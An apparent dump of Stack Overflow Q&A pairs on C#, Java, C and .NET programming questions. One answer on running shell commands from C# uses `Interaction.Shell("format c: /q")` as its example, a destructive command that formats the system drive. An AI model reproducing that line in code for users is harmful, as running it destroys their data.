<pre><code>public class Sample {
  public int get()[] {
    return new int[]{1, 2, 3};
  }
}
</code></pre>

<p>I thought that can't compile and wanted to fix what I thought was a typo, but then I remembered the Java compiler did actually accept it!</p>

<p>Can someone please help me understand what it means? Is it an array of functions?</p>
","33708","","<p>It's a method that returns an <code>int[]</code>.</p>

<blockquote>
  <h3><a href=""http://java.sun.com/docs/books/jls/download/langspec-3.0.pdf"">Java Language Specification</a> (8.4 Method Declarations)</h3>
  
  <p>For compatibility with older versions of the Java platform, a declaration form
  for a method that returns an array is allowed to place (some or all of) the empty
  bracket pairs that form the declaration of the array type after the parameter list.  </p>
  
  <p>This is supported by the obsolescent production:  </p>
  
  <p><em>MethodDeclarator</em>:<br>
  &nbsp;&nbsp;&nbsp;&nbsp;<em>MethodDeclarator</em> [ ]  </p>
  
  <p>but should not be used in new code.</p>
</blockquote>
"
"<p>I've seen a suggested coding standard that reads <code>Never use goto unless in a switch statement fall-through</code>.</p>

<p>I don't follow.  What exactly would this 'exception' case look like, that justifies a <code>goto</code>?</p>
","33708","","<p>This construct is illegal in C#:</p>

<pre><code>switch (variable) {
   case 2: 
       Console.WriteLine(""variable is &gt;= 2"");
   case 1:
       Console.WriteLine(""variable is &gt;= 1"");
}
</code></pre>

<p>In C++, it would run both lines if <code>variable = 2</code>. It may be intentional but it's too easy to forget <code>break;</code> at the end of the first case label. For this reason, they have made it illegal in C#. To mimic the fall through behavior, you will have to explicitly use <code>goto</code> to express your intention:</p>

<pre><code>switch (variable) {
   case 2: 
       Console.WriteLine(""variable is &gt;= 2"");
       goto case 1;
   case 1:
       Console.WriteLine(""variable is &gt;= 1"");
       break;
}
</code></pre>

<p><sub>That said, there are <a href=""http://stackoverflow.com/q/4574102/33708"">a few cases</a> where <code>goto</code> is actually a good solution for the problem. <a href=""http://programmers.stackexchange.com/questions/31104/whats-your-most-controversial-programming-opinion/31111#31111"">Never shut down your brain</a> with ""never use something"" rules. If it were 100% useless, it wouldn't have existed in the language in the first place. Don't use <code>goto</code> is a <em>guideline</em>; it's not a law.</sub></p>
"
"<p>Warning: This question is a bit heretical... religious programmers always abiding by good practices, please don't read it. :)</p>

<p>Does anyone know why the use of <a href=""http://msdn.microsoft.com/en-us/library/system.typedreference%28v=VS.80%29.aspx"">TypedReference</a> is so discouraged (implicitly, by lack of documentation)?</p>

<p>I've found great uses for it, such as when passing generic parameters through functions that shouldn't be generic (when using an <code>object</code> might be overkill or slow, if you need a value type), for when you need an opaque pointer, or for when you need to access an element of an array quickly, whose specs you find at runtime (using <code>Array.InternalGetReference</code>). Since the CLR doesn't even allow incorrect usage of this type, why is it discouraged? It doesn't seem to be unsafe or anything...</p>

<hr>

<p>Other uses I've found for <code>TypedReference</code>:</p>

<p>""Specializing"" generics in C# (this is type-safe):</p>

<pre><code>static void foo&lt;T&gt;(ref T value)
{
    //This is the ONLY way to treat value as int, without boxing/unboxing objects
    if (value is int)
    { __refvalue(__makeref(value), int) = 1; }
    else { value = default(T); }
}
</code></pre>

<p>Writing code that works with generic pointers (this is <em>very</em> unsafe if misused, but fast and safe if used correctly):</p>

<pre><code>//This bypasses the restriction that you can't have a pointer to T,
//letting you write very high-performance generic code.
//It's dangerous if you don't know what you're doing, but very worth if you do.
static T Read&lt;T&gt;(IntPtr address)
{
    var obj = default(T);
    var tr = __makeref(obj);

    //This is equivalent to shooting yourself in the foot
    //but it's the only high-perf solution in some cases
    //it sets the first field of the TypedReference (which is a pointer)
    //to the address you give it, then it dereferences the value.
    //Better be 10000% sure that your type T is unmanaged/blittable...
    unsafe { *(IntPtr*)(&amp;tr) = address; }

    return __refvalue(tr, T);
}
</code></pre>

<p>Writing a <em>method</em> version of the <code>sizeof</code> instruction, which can be occasionally useful:</p>

<pre><code>static class ArrayOfTwoElements&lt;T&gt; { static readonly Value = new T[2]; }

static uint SizeOf&lt;T&gt;()
{
    unsafe 
    {
        TypedReference
            elem1 = __makeref(ArrayOfTwoElements&lt;T&gt;.Value[0] ),
            elem2 = __makeref(ArrayOfTwoElements&lt;T&gt;.Value[1] );
        unsafe
        { return (uint)((byte*)*(IntPtr*)(&amp;elem2) - (byte*)*(IntPtr*)(&amp;elem1)); }
    }
}
</code></pre>

<p>Writing a method that passes a ""state"" parameter that wants to avoid boxing:</p>

<pre><code>static void call(Action&lt;int, TypedReference&gt; action, TypedReference state)
{
    //Note: I could've said ""object"" instead of ""TypedReference"",
    //but if I had, then the user would've had to box any value types
    try
    {
        action(0, state);
    }
    finally { /*Do any cleanup needed*/ }
}
</code></pre>

<p>So why are uses like this ""discouraged"" (by lack of documentation)? Any particular safety reasons? It seems perfectly safe and verifiable if it's not mixed with pointers (which aren't safe or verifiable anyway)...</p>

<hr>

<p>Update:</p>

<p>Sample code to show that, indeed, <code>TypedReference</code> can be twice as fast (or more):</p>

<pre><code>using System;
using System.Collections.Generic;
static class Program
{
    static void Set1&lt;T&gt;(T[] a, int i, int v)
    { __refvalue(__makeref(a[i]), int) = v; }

    static void Set2&lt;T&gt;(T[] a, int i, int v)
    { a[i] = (T)(object)v; }

    static void Main(string[] args)
    {
        var root = new List&lt;object&gt;();
        var rand = new Random();
        for (int i = 0; i &lt; 1024; i++)
        { root.Add(new byte[rand.Next(1024 * 64)]); }
        //The above code is to put just a bit of pressure on the GC

        var arr = new int[5];
        int start;
        const int COUNT = 40000000;

        start = Environment.TickCount;
        for (int i = 0; i &lt; COUNT; i++)
        { Set1(arr, 0, i); }
        Console.WriteLine(""Using TypedReference:  {0} ticks"",
                          Environment.TickCount - start);
        start = Environment.TickCount;
        for (int i = 0; i &lt; COUNT; i++)
        { Set2(arr, 0, i); }
        Console.WriteLine(""Using boxing/unboxing: {0} ticks"",
                          Environment.TickCount - start);

        //Output Using TypedReference:  156 ticks
        //Output Using boxing/unboxing: 484 ticks
    }
}
</code></pre>

<p>(Edit: I edited the benchmark above, since the last version of the post used a debug version of the code [I forgot to change it to release], and put no pressure on the GC. This version is a bit more realistic, and on my system, it's more than three times faster with <code>TypedReference</code> on average.)</p>
","33708","","<p>Short answer: <strong>portability</strong>.</p>

<p>While <code>__arglist</code>, <code>__makeref</code>, and <code>__refvalue</code> are <em>language extensions</em> and are undocumented in the C# Language Specification, the constructs used to implement them under the hood (<code>vararg</code> calling convention, <code>TypedReference</code> type, <code>arglist</code>, <code>refanytype</code>, <code>mkanyref</code>, and <code>refanyval</code> instructions) are perfectly documented in the <a href=""http://www.ecma-international.org/publications/standards/Ecma-335.htm"">CLI Specification (ECMA-335)</a> in the <strong>Vararg library</strong>. </p>

<p>Being defined in the Vararg Library makes it quite clear that they are primarily meant to support variable-length argument lists and not much else.  Variable-argument lists have little use in platforms that don't need to interface with external C code that uses varargs.  For this reason, the Varargs library is not part of any CLI profile. Legitimate CLI implementations may choose not to support Varargs library as it's not included in the CLI Kernel profile: </p>

<blockquote>
  <h2>4.1.6 Vararg</h2>
  
  <p>The <strong>vararg feature set</strong> supports variable-length argument lists and runtime-typed pointers.  </p>
  
  <p><strong>If omitted:</strong> Any attempt to reference a method with the <code>vararg</code> calling convention or the signature encodings associated with vararg methods (see Partition II) shall throw the <code>System.NotImplementedException</code> exception. Methods using the CIL instructions <code>arglist</code>, <code>refanytype</code>, <code>mkrefany</code>, and <code>refanyval</code> shall throw the <code>System.NotImplementedException</code> exception. The precise timing of the exception is not specified. The type <code>System.TypedReference</code> need not be defined.</p>
</blockquote>

<h3>Update (reply to <code>GetValueDirect</code> comment):</h3>

<p><code>FieldInfo.GetValueDirect</code> are <code>FieldInfo.SetValueDirect</code> are <strong>not</strong> part of Base Class Library. Note that there's a difference between .NET Framework Class Library and Base Class Library. BCL is the only thing required for a conforming implementation of the CLI/C# and is documented in <a href=""http://www.ecma-international.org/publications/techreports/E-TR-084.htm"">ECMA TR/84</a>. (In fact, <code>FieldInfo</code> itself is part of the Reflection library and that's not included in CLI Kernel profile either).</p>

<p>As soon as you use a method outside BCL, you are giving up a bit of portability (and this is becoming increasingly important with the advent of non-.NET CLI implementations like Silverlight and MonoTouch).  Even if an implementation wanted to increase compatiblility with the Microsoft .NET Framework Class Library, it could simply provide <code>GetValueDirect</code> and <code>SetValueDirect</code> taking a <code>TypedReference</code> without making the <code>TypedReference</code> specially handled by the runtime (basically, making them equivalent to their <code>object</code> counterparts without the performance benefit).</p>

<p>Had they documented it in C#, it would have had at least a couple implications: </p>

<ol>
<li>Like any feature, it <em>may</em> become a roadblock to new features, especially since this one doesn't really fit in the design of C# and requires weird syntax extensions and special handing of a type by the runtime. </li>
<li>All implementations of C# have to somehow implement this feature and it's not necessarily trivial/possible for C# implementations that don't run on top of a CLI at all or run on top of a CLI without Varargs.   </li>
</ol>
"
"<pre><code>ArrayList x=new ArrayList();
x.Add(10);
x.Add(""SS"");

foreach(string s in x)
{
}
</code></pre>

<p>Does it mean that when foreach is run it tries to cast element of array list to type in foreach expression?</p>
","33708","","<p>Yes, if an element is not convertible to the type, you'll get an <code>InvalidCastException</code>. In your case, you cannot cast boxed <code>int</code> to <code>string</code> causing an exception to be thrown. </p>

<p>Essentially, it's equivalent to:</p>

<pre><code>foreach (object __o in list) {
    string s = (string)__o;
    // loop body
}
</code></pre>
"
"<p>regarding th stack trace depth in debug and release mode. I have come to the following conclusion (calling exception.ToString()):</p>

<p>at debug mode you get the complete stack trace with line numbers (several frames) at release mode instead complete stack trace you get only the throwing method in try block (single frame) with line numbers</p>

<p>-is that true ? 
-is there any way to get the complete stack tracve on release mode ?</p>
","33708","","<p>You get line numbers in stack trace if you have the PDB file associated with your assembly. Even in Release builds, you can have the compiler to generate the PDB files and ship them alongside your assembly.  You can use <a href=""http://msdn.microsoft.com/en-us/library/8cw0bt21%28v=vs.80%29.aspx""><code>csc /debug:pdbonly</code></a> when you're compiling your application. In Visual Studio 2010, you can use Project Properties -> Build -> Advanced -> Debug Info = pdb-only to achieve the same thing.</p>

<h3>Update (stack trace depth):</h3>

<p>You get full stack trace in Release builds.  However, compilers may inline methods and optimize tail calls, making the stack trace different.</p>
"
"<p>How could users in a ""customer"" role be retrieved from a MembershipUserCollection?</p>
","33708","","<p><code>Roles.GetUsersInRole</code> returns a <code>string[]</code> of user names in a role. If you really want the <code>MembershipUser</code> objects, you can use:</p>

<pre><code>var list = Roles.GetUsersInRole(""roleName"").Select(Membership.GetUser).ToList()
</code></pre>

<p>Of course, this is performance intensive as it hits the database once for every user.</p>

<p>If you are willing to give up provider-independence, you can query the underlying database directly and perform a join on the database server to get all users in a specific role.</p>
"
"<p>I have a .net dll and when I add it in the references, it goes without any issue. The problem is that its namespaces start with an integer e.g. <strong>3gppsa5.org.AlarmIRPSystem</strong> and when I try to use or import it, the intelliSense doesn't allow and says <strong>identifier expected</strong>.</p>

<p>I don't have the source of this library so I can't change it. I know it is compiled and the Object Browser is correctly showing all of its classes and functions. However, I am unable to use it in my code. Is there any way to use it in VB .NET</p>

<p>I've tried using Reflection, but found many problems. I want to declare the variable something like;</p>

<pre><code>Dim MyIRP As 3gppsa5.org.AlarmIRPSystem.AlarmIRP
</code></pre>

<p>Is there any way to achieve this without using reflection and having complete intellisense support.</p>

<p>Thanks.</p>
","33708","","<p>Not really. This identifier is not CLS compliant. Non-CLS compliant identifiers are not guaranteed to be usable in other .NET languages.</p>
"
"<p>I'm rewriting a Ruby program in C#. It has a lot of system() calls (like system(""./program"")).</p>

<p>Is there a way to call it in C#, or do I have to use Systemm.Diagnostics.Process?</p>
","33708","","<p>If you don't want to bother with splitting up the arguments and set up the <code>ProcessStartInfo</code>, you can simply add a reference to Microsoft.VisualBasic assembly and use <a href=""http://msdn.microsoft.com/en-us/library/microsoft.visualbasic.interaction.shell.aspx"" rel=""nofollow""><code>Microsoft.VisualBasic.Interaction.Shell</code> static method</a>.</p>

<pre><code>using Microsoft.VisualBasic;

Interaction.Shell(""format c: /q"");
</code></pre>
"
"<p>I have a list of static Strings:</p>

<pre><code>static final String FOO = ""foo"";
static final String BAR = ""bar"";
static final String DUH = ""DUH"";
static final String GOO = ""goo"";
static final String ZUT = ""zut"";
</code></pre>

<p>I want to check if a given string is part of this list, but want to keep the possibility reference each item individually. I want the check implementation to be unaware of the individual items. So not like this:</p>

<pre><code>boolean isValid(String item) {
  return (item.equalsIgnoreCase(FOO) || item.equalsIgnoreCase(BAR) || ......)
}
</code></pre>

<p>Thnx!
Bas Hendriks</p>
","33708","","<p>Create an array containing all the strings and use a for loop to check if one of them matches the input string.</p>
"
"<p>Ok, I've thumped on this idea all day now, and I have reached the part where I admit I just flat out don't know. It's possible that what I'm doing is just stupid and there is a better way, but this is where my thinking has brought me.</p>

<p>I am attempting to use a generic method to load forms in WinForms:</p>

<pre><code>protected void LoadForm&lt;T&gt;(ref T formToShow, bool autoLoaded) where T : FormWithWorker, new()
{
    // Do some stuff
}
</code></pre>

<p>The forms are loaded by a ToolStripMenuItem (either through the selection of the item or using the Open Windows menu item). They are lazy-loaded, so there are fields for the forms within the MDI parent, but they are null until they are needed. I have a common method used for ToolStripMenuItem_Click that handles all of the menu item clicks. The method has no real way of knowing which form is being called for except that the name of the ToolStripMenuItem matches a pattern chosen for the form class names they correspond to. So, using the name of the ToolStripMenuItem, I can divine the name of the type of form being requested and the name of the private field allocated to store the reference for that form.</p>

<p>Using that, I can either use a growing/contracting switch statement with hard-coded types and string matches to call method with the specific type set (undesirable), or I can use Reflection to get the field and create the instance of the type. The problem to me is, <code>System.Activator.CreateInstance</code> provides an ObjectHandler that can't be cast to the types that I need. Here is a snippet of what I have so far:</p>

<pre><code>string formName = ""_form"" + ((ToolStripMenuItem)sender).Name.Replace(""ToolStripMenuItem"", """");
string formType = formName.Substring(1);

FieldInfo fi = this.GetType().GetField(formName, BindingFlags.NonPublic | BindingFlags.Instance);

FormWithWorker formToLoad = (FormWithWorker)fi.GetValue(this);
if (formToLoad == null)
{
    formToLoad = (????)System.Activator.CreateInstance(""MyAssemblyName"", formType);
}

this.LoadForm(ref formToLoad, false);
fi.SetValue(this, formToLoad);
</code></pre>

<p>I know the string name of the type that goes in for (????) but at compile-time I do not know the type because it changes. I have tried a bunch of ways to get this cast/instantiation to work, but none have been successful. I would very much like to know if it's possible to perform such a cast knowing the type only as a string. I tried using <code>Type.GetType(string, string)</code> to perform the cast, but the compiler didn't like it. If someone has a different idea on how to load the forms dynamically because I'm just doing it stupidly, please let me know about it.</p>
","33708","","<p>This problem is usually resolved by casting to a common base class or interface of all potential types.</p>

<p>In C# 4, you can also assign it to a <code>dynamic</code> variable to hold the return value and call arbitrary methods on it. The methods will be late bound. However, I prefer to stick to the former solution whenever possible.</p>
"
"<p>Is there a way to only print part of a string?</p>

<p>For example, if I have</p>

<pre><code>char *str = ""hello there"";
</code></pre>

<p>Is there a way to just print <code>""hello""</code>, keeping in mind that the substring I want to print is variable length, not always 5 chars?</p>

<p>I know that I could use a <code>for</code> loop and <code>putchar</code> or that I could copy the array and then add a null-terminator but I'm wondering if there's a more elegant way?</p>
","33708","","<p>This will work too:</p>

<pre><code>fwrite(str, 1, len, stdout);
</code></pre>

<p>It will not have the overhead of parsing the format specifier. Obviously, to adjust the beginning of the substring, you can simply add the index to the pointer.</p>
"
"<p>I have this:</p>

<pre><code>public class MyClass&lt;T&gt;:  IView
{
        public View View()
        {
            return this;
        }
        public void Render(ViewContext viewContext, System.IO.TextWriter writer)
        {
            // We should cycle though all supported controls and generate HTML for them.
            // What about the validation binding?

            typeof(T).GetFields().ToList&lt;FieldInfo&gt;().ForEach(x =&gt; writer.WriteLine(x.FieldType + "" is called "" + x.Name + ""&lt;/br&gt;""));           
        }  


}
</code></pre>

<p>I get an error that it cannot implicitly cast this to a View. When I attempt a cast it fails. Is there any way to do this? Why does it fail?</p>

<p><strong>EDIT: View implementation added. I trimmed too much out of the class. I apologize for not posting enough.</strong></p>
","33708","","<p><code>MyClass&lt;T&gt;</code> instances are not convertible to <code>View</code>. They are only convertible to <code>IView</code>. If you want to inherit from <code>View</code> class, you should just do that. Implementing a similarly named interface doesn't magically cause the class to inherit from the base type you need:</p>

<pre><code>public class MyClass&lt;T&gt; : View { ... }
</code></pre>
"
"<p>Cleaning a handful of warnings on a <code>C#</code> project I have inherited, I found this code snippet:</p>

<pre><code>private bool _WriteValue(object FieldValue,..,..)
  ...
  if(MultipFactor!=1)
     FieldValue=((double)FieldValue)*MultipFactor;
  else
    FieldValue=FieldValue;
</code></pre>

<p>I've obviously burninated the <code>else</code> block without thinking too much, just wondering why the previous programmer has left that part. </p>

<ul>
<li>Was it just too lazy to delete it?  </li>
<li>Was it a courtesy for some future programmers to save some typing in case of specific changes?   </li>
<li>Is it hiding something dangerous?</li>
</ul>

<p>In your opinion, are there any valid circumstances where <code>foo=foo</code> makes sense?</p>

<hr>

<p>Some more details on the <code>_WriteValue</code> method:</p>

<p>The <code>_WriteValue</code> method is wrapped into different overloaded <code>WriteValue</code> methods that pass to the <code>object FieldValue</code> parameter, values of the following types: <code>int</code>, <code>long</code>, <code>string</code> and <code>Datetime</code>.</p>
","33708","","<p>The programmer was probably unaware of the existence of conditional breakpoints and leveraged that statement as a location to place a breakpoint that triggered conditionally.</p>

<p><sub>Just to make it clear, I'm not saying that this is a good idea, but it's a trick in environments without conditional breakpoints.</sub></p>
"
"<p>I haven't found any information on MSDN regarding this problem.</p>

<p>If we create an <code>Expression&lt;Func&lt;T&gt;&gt;</code> and call <code>Compile()</code> on it does CLR cache compiled results, so any subsequent calls of <code>Compile()</code> on the same expression wouldn't have much impact because CLR would return previously compiled <code>Func&lt;T&gt;</code> from internal memory cache? </p>

<p>AFAIK lambda expressions are immutable, so internal caching would actually make sense.</p>
","33708","","<p>No, it simply returns a delegate to the compiled version.  The expression itself is not affected.</p>

<pre><code>Expression&lt;Func&lt;T&gt;&gt; expression = ...;
Func&lt;T&gt; compiled = expression.Compile();
T value = compiled();
</code></pre>
"
"<p>I'm new to C and I have a function that calculates a few variables. But for now let's simplify things. What I want is to have a function that ""returns"" multiple variables. Though as I understand it, you can only return one variable in C. So I was told you can pass the address of a variable and do it that way. This is how far I got and I was wondering I could have a hand. I'm getting a fair bit of errors regarding C90 forbidden stuff etc. I'm almost positive it's my syntax.</p>

<p>Say this is my main function:</p>

<pre><code>void func(int*, int*);

int main()
{
    int x, y;
    func(&amp;x, &amp;y);

    printf(""Value of x is: %d\n"", x);
    printf(""Value of y is: %d\n"", y);

    return 0;
}

void func(int* x, int* y)
{
    x = 5;
    y = 5;
}
</code></pre>

<p>This is essentially the structure that I'm working with. Could anyone give me a hand here?</p>
","33708","","<p>You should use <code>*variable</code> to refer to what a pointer points to:</p>

<pre><code>*x = 5;
*y = 5;
</code></pre>

<p>What you are currently doing is to set the pointer to address 5. You may get away with crappy old compilers, but a good compiler will detect a type mismatch in assigning an <code>int</code> to an <code>int*</code> variable and will not let you do it without an explicit cast.</p>
"
"<pre><code>abstract class DirectiveNode
{
    public static readonly RequirementOptions ArgumentOptions = RequirementOptions.Optional;
}

class IfNode : DirectiveNode
{
    static IfNode()
    {
        ArgumentOptions = RequirementOptions.Required; // error here
    }
</code></pre>

<p>I don't understand the problem. I thought <code>static IfNode()</code> was a static constructor? Why the error?</p>

<hr>

<p>Just found this: <a href=""http://stackoverflow.com/questions/1420859/assigning-to-static-readonly-field-of-base-class"">Assigning to static readonly field of base class</a></p>
","33708","","<p>You can only assign it in the static constructor of the <em>same</em> class.</p>

<p>By the way, it sounds like you expect the static field to contain different values depending on which derived class you are talking about.  This is not how it works. Only a single instance of the field will exist and it's shared across all derived classes. </p>
"
"<p>How to check if client computer is running a 32-bit or 64-bit OS in ASP.NET 3.5?</p>
","33708","","<p>There's no way to reliably determine whether a client runs a 64 bit operating system or a 32 bit one. What if the client is not a full blown computer at all?</p>

<p>All you can do without running any platform specific code on the client is to trust the user agent string passed by the browser. Some browsers, like Internet Explorer, do in fact send this clue in the user agent string.</p>

<p>For instance, 64-bit IE will send ""Win64; x64"" as part of the user agent string and 32-bit IE running on a 64-bit edition of Windows will send ""WOW64"" as part of it.  </p>
"
"<p>I have a method to delete records in a DB, the query is created correctly and the records are deleted but after 40 seconds to 1 minute</p>

<p>If i execute the query in the DB prompt the record is deleted immediately</p>

<p>The code i have is only :</p>

<ul>
<li>getting the database connection</li>
<li>preparing the statement passing 3 variables to the ""delete from"" sentence</li>
<li>calling executeUpdate on the statement</li>
<li>calling commit on the connection</li>
<li>closing the db connection</li>
</ul>

<p>What could it be wrong? any clue?</p>
","33708","","<p>You are implicitly assuming that a DELETE statement is very trivial in all cases, which is not always true. At very least, it needs to find the records it want to remove in the table. This may require an entire table scan if, for example, the WHERE predicate cannot leverage an existing index.</p>
"
"<p>Is there a difference between:</p>

<pre><code>public void main(String args[]) { ... } 
</code></pre>

<p>and</p>

<pre><code>public void main(String[] args) { ... }
</code></pre>

<p>I don't believe so, but I am wondering.</p>
","33708","","<p>Semantically, they are identical. However, I'd recommend using the latter syntax (<code>String[] args</code>) when declaring arrays. The former syntax is there mainly for compatibility with C syntax. </p>

<p>Since <code>String[]</code>, as a whole, is the type of the object in Java, it's more consistent and clear not to split it up.</p>

<p>A <a href=""http://stackoverflow.com/questions/4699309/weird-after-java-method-signature"">similar question</a> addresses the <code>[]</code> after method argument list. </p>
"
"<p>So, exactly what the title states. I'd like to use a query like this:</p>

<pre><code>NSString *querySQL = [NSString stringWithFormat:@""SELECT COUNT (*) FROM Devices WHERE Location LIKE '%@%'"", name];
</code></pre>

<p>What it basically asks, is for example: <code>SELECT COUNT (*) FROM Devices WHERE Location LIKE 'N%'</code> . Then I'd like to find all the computers in building N, including all sublocations (like N33). </p>

<p>The question is: how do I insert the %-sign in the query? Currently, it shows <code>'N'</code> only...</p>
","33708","","<p>Use two % signs to escape %:</p>

<pre><code>NSString *querySQL = [NSString stringWithFormat:
     @""SELECT COUNT (*) FROM Devices WHERE Location LIKE '%@%%'"", name];
</code></pre>

<p>(of course, you need to <a href=""http://xkcd.com/327/"">sanitize your input</a>, or use a parameterized query in the first place, to prevent SQL injection attacks)</p>
"
"<p>Say I have <code>List&lt;Foo&gt; foos</code> where the current order of elements is important. If I then apply a LINQ Enumerable method such as <code>GroupBy</code>, <code>Where</code> or <code>Select</code>, can I rely on the resulting <code>IEnumerable&lt;Foo&gt;</code> to iterate in the same relative order as the original list?</p>
","33708","","<p>Yes, for <code>Enumerable</code> methods (LINQ to Objects, which applies to <code>List&lt;T&gt;</code> you mentioned), you can rely on the order of elements returned by <code>Select</code>, <code>Where</code>, or <code>GroupBy</code>. This is not the case for things that are inherently unordered like <code>ToDictionary</code> or <code>Distinct</code>.</p>

<blockquote>
  <h3>From <a href=""http://msdn.microsoft.com/en-us/library/bb534501.aspx"">Enumerable.GroupBy</a> documentation:</h3>
  
  <p>The <code>IGrouping&lt;TKey, TElement&gt;</code> objects are yielded in an order based on the order of the elements in source that produced the first key of each <code>IGrouping&lt;TKey, TElement&gt;</code>. Elements in a grouping are yielded in the order they appear in <code>source</code>.</p>
</blockquote>

<p>This is not necessarily true for <code>IQueryable</code> extension methods (other LINQ providers).</p>
"
"<p>I need to define a processing rule for web data in iOS and thought it would be a good idea to pull the processing rule as a script file from my server and execute it on the iOS device, since the web API I'm interacting with might change URLs or response syntax and I need to be able to fix such issues fast and cannot rely on pushing an update (takes forever).</p>

<p>I wanted to do it with a small <code>JS</code> file that is pulled from my server every once and a while, but unfortunately iOS doesn't include the <code>JavaScriptCore</code> framework.</p>

<p>Are there other options?</p>
","33708","","<p>Apple developer agreement will not let you run a downloaded, interpreted script, on the device. </p>

<p>Your best bet is probably downloading a data structure (potentially in JSON format) and parse that and take some predefined actions in your client code based on that, rather than trying to execute the downloaded code directly.</p>
"
"<p>i am unable to find the O(1) way to find log of n with any base</p>

<p>even if you can determine O(1) time way to calculate log of n with base 2 ,it would be thank full.
the  link which i encountered is this <a href=""http://geeksforgeeks.org/?p=10879"" rel=""nofollow"">http://geeksforgeeks.org/?p=10879</a> (please read the comments on that).
they are saying to calculate the number of zero's in front of a number but how that can be done in O(1) time...
again i took help of this site  whose link is <a href=""http://stackoverflow.com/questions/6234533/how-to-find-the-leading-number-of-zeros-in-a-number-using-c"">How To Find The Leading Number Of Zero&#39;s In a Number using C</a>
but O(1) is big issue for me.
any help would be highly appreciated.</p>
","33708","","<p>You cannot do that in O(1) for arbitrarily large numbers. You need at least O(log(n)) to look at the binary representation of the number once.</p>

<p>If you put a bound on the value of n (e.g. 64 bits), then <em>everything</em> is doable in O(1)! O-notation will not make any real sense in that case.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/1331739/enum-type-constraints-in-c"">Enum type constraints in C#</a>  </p>
</blockquote>



<p>Is it possible to use <code>enum</code> types as a generic paramter by using its wrapper class <code>Enum</code>?</p>

<p>I have different enums:</p>

<pre><code>enum errors1 { E1, E3, E8 };
enum errors2 { E0, E2, E9 };
enum errors3 { E7, E4, E5 };
</code></pre>

<p>With the following class declaration I thought I could achieve it:</p>

<pre><code>public class MyErrors&lt;T&gt; where T : Enum
{
   T enumeration;

   public T getEnumeration()
   {
       return enumeration;
   }

   static void Main(string[] args)
   {

       Program&lt;error1&gt; p = new Program&lt;error1&gt;();
       p.getEnumeration().E1  // this call does NOT work
   }
</code></pre>

<p>However, since the general type is <code>Enum</code> I can only access the member and methods of the <code>Enum</code> class. So is it possible to implement it the way I meant to or what other approach should I use?</p>
","33708","","<p>This is not doable at the language level in C#, but it's supported by the underlying CLR. You can use Jon Skeet's <a href=""http://code.google.com/p/unconstrained-melody/"">Unconstrained Melody</a>, which will transform the generated binary to one with the actual enum generic constraint.</p>
"
"<p>For one of my projects, what I really wanted to do was this (simplifying it to the bare minimum);</p>

<pre><code>struct Move
{
    int src;
    int dst;
};

struct MoveTree
{
    Move move;
    std::vector&lt;MoveTree&gt; variation;
};
</code></pre>

<p>I must admit that I assumed that it wouldn't be possible to do this directly, I thought a vector of MoveTree s within a MoveTree would be verboten. But I tried it anyway, and it works beautifully. I am using Microsoft Visual Studio 2010 Express.</p>

<p>Is this portable ? Is it good practise ? Do I have anything to worry about ?</p>

<p>Edit: I've asked a second <a href=""http://stackoverflow.com/questions/6527917/how-can-i-emulate-recursive-a-type-definition-in-c"">question</a> hoping to find a good way of doing this.</p>
","33708","","<p><code>MoveTree</code> is an incomplete type inside its definition. The standard does not guarantee instantiation of STL templates with incomplete types.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/5611724/a-riddle-in-c"">A riddle (in C)</a>  </p>
</blockquote>



<pre><code> #include&lt;stdio.h&gt;

 #define TOTAL_ELEMENTS (sizeof(array) / sizeof(array[0]))
 int array[] = {23,34,12,17,204,99,16};

 int main()
 {
  int d;

     for(d=-1;d &lt;= (TOTAL_ELEMENTS-2);d++)
         printf(""%d\n"",array[d+1]);

  return 0;
 }
</code></pre>
","33708","","<p>Problem is, the <code>TOTAL_ELEMENTS</code> is an unsigned value and on the implementation you're trying this on, it's probably <code>unsigned long int</code>. The comparison will try to promote the integer value of <code>d</code>, <code>-1</code>, to an <code>unsigned long</code>, which will result in something like 0xFFFFFFFFFFFFFFFF and that's greater than 7-2=5 (the result of <code>TOTAL_ELEMENTS-2</code>); therefore, the loop condition is evaluated to false and the body is never executed.  If you explicitly cast away <code>unsigned</code> from the right hand side of the comparison operator, it should work just fine:</p>

<pre><code>for(d=-1;d &lt;= (int)(TOTAL_ELEMENTS-2);d++)
     printf(""%d\n"",array[d+1]);
</code></pre>

<p>(By the way, the <code>COUNTOF</code> macro is generally defined as:</p>

<pre><code>#define COUNTOF(x) ((sizeof((x))/sizeof(*(x)))
</code></pre>

<p>and is used like <code>COUNTOF(array)</code>, rather than defining a macro for each array. This is not the reason you're seeing the problem, however; your macro is being used correctly here. This is completely orthogonal to the issue, and it's just a coding style advice.)</p>
"
"<p>just a question for my understanding. on my mac when I use <code>ifconfig</code> command on my mac I get the following interfaces:</p>

<ul>
<li>en0</li>
<li>en1</li>
<li>lo0</li>
<li>fw0</li>
<li>vment0</li>
<li>vment1</li>
</ul>

<p>I don't understand why there are so many. I understand that eth0 would be for LAN connections, and that en0 is the wireless connection. But macbook only has one airport..so why en1 as well? not sure what vments are for either. </p>
","33708","","<p>There's no <code>eth0</code> on default configuration of OS X. By default, <code>en0</code> and <code>en1</code> are your physical network connections (wired and wireless LAN). <code>lo0</code> is the loopback interface. <code>fw0</code> is the IP over Firewire interface; and <code>vmnet</code> interfaces are installed by VMware for network communication with virtual machines.</p>
"
"<p>This problem seems related to <a href=""http://stackoverflow.com/questions/1430180/what-is-needed-in-the-httpcontext-to-allow-formsauthentication-signout-to-execu"">this</a> post, but I was not able to infer a solution from the thread.</p>

<p>I noticed this code in an application I inherited (after noting in a log file that an exception was being eaten):</p>

<pre><code>    protected void Session_End(object sender, EventArgs e)
    {
        try
        {
            FormsAuthentication.SignOut();
            FormsAuthentication.RedirectToLoginPage();
            //if (this.Context.Handler is IRequiresSessionState || this.Context.Handler is IReadOnlySessionState)
            //{
            //    FormsAuthentication.SignOut();
            //    FormsAuthentication.RedirectToLoginPage();
            //}
        }
        catch (Exception ex)
        {
            this.GetType().GetLogger().Error(ex);
        }
    }
</code></pre>

<p>I am wondering a few things. First, how is SignOut throwing a null reference exception? Is it an exceptional case, or am I doing something inherently wrong in my program? Next, what should I be testing against to head-off this exception before it is thrown?</p>

<blockquote>
  <p>15:51:57,288 [13] ERROR ASP.global_asax - System.NullReferenceException: Object reference not set to an instance of an object.
     at System.Web.Security.FormsAuthentication.SignOut()
     at  MvcApplication.Session_End</p>
</blockquote>

<p>Thanks</p>
